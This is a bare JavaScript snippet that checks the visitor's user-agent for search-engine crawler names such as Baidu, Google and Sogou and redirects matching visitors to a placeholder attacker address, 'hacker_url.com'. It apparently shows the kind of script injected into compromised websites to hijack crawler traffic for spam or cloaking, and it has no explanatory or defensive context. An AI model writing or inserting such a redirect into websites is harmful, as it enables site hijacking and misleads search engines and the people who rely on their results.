let se_list = [
    "baidu",
    "soso",
    "google",
    "360",
    "sogou",
    "spider"
];
let s = navigator.userAgent.toLowerCase();
for (let i = 0; i < se_list.length; i++) {
    if (s.indexOf(se_list[i]) > 0) {
        window.location.href = "http://www.hacker_url.com";
    }
}